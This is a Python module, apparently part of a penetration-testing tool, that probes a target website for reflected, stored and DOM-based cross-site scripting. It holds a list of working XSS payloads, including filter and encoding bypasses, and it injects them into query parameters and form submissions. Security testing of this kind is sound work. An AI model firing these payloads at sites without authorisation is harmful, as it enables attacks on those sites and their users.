import requests
import re
import random
import string
from urllib.parse import urlparse, parse_qs


class XSSAttack:
    """Enhanced XSS testing — reflected, stored, and DOM-based."""

    NAME = "xss"
    DESCRIPTION = "Cross-Site Scripting (XSS) Testing"

    REFLECTED_PAYLOADS = [
        # Basic script tags
        '<script>alert("{marker}")</script>',
        '<ScRiPt>alert("{marker}")</ScRiPt>',
        # Event handlers
        '<img src=x onerror=alert("{marker}")>',
        '<svg onload=alert("{marker}")>',
        '<body onload=alert("{marker}")>',
        '<input onfocus=alert("{marker}") autofocus>',
        '<details open ontoggle=alert("{marker}")>',
        '<marquee onstart=alert("{marker}")>',
        # Encoding bypasses
        '<img src=x onerror="&#97;lert(\'{marker}\')">',
        '<a href="javascript:alert(\'{marker}\')">click</a>',
        '<iframe src="javascript:alert(\'{marker}\')">',
        # Attribute injection
        '" onmouseover="alert(\'{marker}\')" x="',
        "' onmouseover='alert(\"{marker}\")' x='",
        '"><img src=x onerror=alert("{marker}")>',
        "'><<img src=x onerror=alert('{marker}')>",
        # Template injection
        '{{constructor.constructor("alert(\'{marker}\')")()}}',
        '${{{marker}}}',
        # Filter bypass variants
        '<scr<script>ipt>alert("{marker}")</scr</script>ipt>',
        '<IMG """><SCRIPT>alert("{marker}")</SCRIPT>">',
    ]

    def __init__(self, base_url: str, domain: str, session: requests.Session = None):
        self.base_url = base_url
        self.domain = domain
        self.session = session or requests.Session()
        self.session.headers.update({"User-Agent": "SkillGuard-PenTest/1.0"})
        self.findings = []

    def _generate_marker(self) -> str:
        token = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
        return f"sgxss{token}"

    def _is_reflected(self, response_text: str, marker: str, payload: str) -> bool:
        """Check if the payload marker appears unescaped in an executable context."""
        if not response_text or not marker:
            return False

        # Exact raw payload reflected unescaped
        if payload and payload in response_text:
            return True

        # Event handlers reflected unescaped
        event_checks = [
            f'onerror=alert("{marker}")',
            f'onload=alert("{marker}")',
            f'onfocus=alert("{marker}")',
            f'ontoggle=alert("{marker}")',
            f'onmouseover=alert("{marker}")',
            f"onerror=alert('{marker}')",
            f"onload=alert('{marker}')",
            f"onfocus=alert('{marker}')",
            f"ontoggle=alert('{marker}')",
            f"onmouseover=alert('{marker}')",
        ]
        for check in event_checks:
            if check in response_text and f"&lt;" not in response_text[:response_text.find(check)]:
                return True

        # Alert inside an unescaped <script> tag
        script_pattern = rf"<script\b[^>]*>[^<]*alert\(['\"]?{re.escape(marker)}['\"]?\)[^<]*</script>"
        if re.search(script_pattern, response_text, re.IGNORECASE):
            return True

        return False

    def _get_injection_points(self, context: dict = None) -> list[dict]:
        points = []
        seen = set()
        parsed = urlparse(self.base_url)
        params = parse_qs(parsed.query)
        for param_name in params:
            if param_name not in seen:
                seen.add(param_name)
                points.append({"type": "query_param", "name": param_name, "method": "GET"})

        if context and "forms" in context:
            for form in context["forms"]:
                for field in form.get("fields", []):
                    if field not in seen:
                        seen.add(field)
                        points.append({"type": "form_field", "name": field, "method": "GET"})

        # Fallback candidate parameters if no existing query params or forms found
        if not points:
            COMMON_XSS_PARAMS = ["q", "search", "query", "id", "keyword", "s", "redirect", "page", "name", "email"]
            for param in COMMON_XSS_PARAMS:
                points.append({"type": "probed_param", "name": param, "method": "GET"})

        return points

    def test_reflected(self, context: dict = None) -> list[dict]:
        """Test for reflected XSS across all injection points with multiple payloads."""
        findings = []
        points = self._get_injection_points(context)

        for point in points:
            name = point["name"]
            found = False
            for payload_template in self.REFLECTED_PAYLOADS:
                if found:
                    break
                marker = self._generate_marker()
                payload = payload_template.format(marker=marker)
                try:
                    resp = self.session.get(
                        self.base_url, params={name: payload}, timeout=10
                    )
                    if self._is_reflected(resp.text, marker, payload):
                        findings.append({
                            "rule": "XSS_REFLECTED",
                            "description": (
                                f"Reflected XSS via '{name}' — payload rendered unescaped in response"
                            ),
                            "severity": "HIGH",
                            "parameter": name,
                            "payload": payload,
                            "technique": "reflected",
                        })
                        found = True
                except requests.RequestException:
                    continue

        return findings

    def test_stored(self, context: dict = None) -> list[dict]:
        """Test for stored XSS by POSTing payloads then checking if they persist."""
        findings = []
        if not context or "forms" not in context:
            return findings

        for form in context.get("forms", []):
            fields = form.get("fields", [])
            if not fields:
                continue

            for target_field in fields:
                marker = self._generate_marker()
                payload = f'<script>alert("{marker}")</script>'
                form_data = {}
                for field in fields:
                    form_data[field] = payload if field == target_field else "test_value"

                try:
                    # POST the payload
                    self.session.post(self.base_url, data=form_data, timeout=10)
                    # Check if it persists on the page
                    check_resp = self.session.get(self.base_url, timeout=10)
                    if self._is_reflected(check_resp.text, marker, payload):
                        findings.append({
                            "rule": "XSS_STORED",
                            "description": (
                                f"Stored XSS via form field '{target_field}' — "
                                f"payload persists on page after submission"
                            ),
                            "severity": "HIGH",
                            "parameter": target_field,
                            "payload": payload,
                            "technique": "stored",
                        })
                except requests.RequestException:
                    continue

        return findings

    def test_dom_based(self, context: dict = None) -> list[dict]:
        """Detect potential DOM-based XSS by analyzing JavaScript sinks and sources."""
        findings = []

        try:
            resp = self.session.get(self.base_url, timeout=10)
            html = resp.text

            dom_sinks = [
                (r"document\.write\s*\(", "document.write()"),
                (r"\.innerHTML\s*=", ".innerHTML assignment"),
                (r"\.outerHTML\s*=", ".outerHTML assignment"),
                (r"eval\s*\(", "eval()"),
                (r"document\.location\s*=", "document.location assignment"),
                (r"window\.location\.href\s*=", "window.location.href assignment"),
                (r"\.insertAdjacentHTML\s*\(", ".insertAdjacentHTML()"),
                (r"setTimeout\s*\(\s*['\"]", "setTimeout with string"),
                (r"setInterval\s*\(\s*['\"]", "setInterval with string"),
            ]

            dom_sources = [
                (r"location\.hash", "location.hash"),
                (r"location\.search", "location.search"),
                (r"document\.URL", "document.URL"),
                (r"document\.documentURI", "document.documentURI"),
                (r"document\.referrer", "document.referrer"),
                (r"window\.name", "window.name"),
                (r"postMessage", "postMessage"),
            ]

            found_sinks = [name for pat, name in dom_sinks if re.search(pat, html)]
            found_sources = [name for pat, name in dom_sources if re.search(pat, html)]

            if found_sinks and found_sources:
                findings.append({
                    "rule": "XSS_DOM",
                    "description": (
                        f"Potential DOM-based XSS — untrusted sources "
                        f"({', '.join(found_sources)}) may flow into dangerous sinks "
                        f"({', '.join(found_sinks)})"
                    ),
                    "severity": "HIGH",
                    "technique": "dom-based",
                    "sinks": found_sinks,
                    "sources": found_sources,
                })
            elif found_sinks:
                findings.append({
                    "rule": "XSS_DOM_SINK",
                    "description": (
                        f"Dangerous DOM sinks detected: {', '.join(found_sinks)} "
                        f"— manual review recommended"
                    ),
                    "severity": "MEDIUM",
                    "technique": "dom-based",
                    "sinks": found_sinks,
                })

        except requests.RequestException:
            pass

        return findings

    def run(self, context: dict = None) -> list[dict]:
        """Run all XSS tests."""
        self.findings = []

        self.findings.extend(self.test_reflected(context))
        self.findings.extend(self.test_stored(context))
        self.findings.extend(self.test_dom_based(context))

        if not self.findings:
            self.findings.append({
                "rule": "XSS_NONE",
                "description": "No XSS vulnerabilities detected with tested payloads",
                "severity": "INFO",
            })

        return self.findings
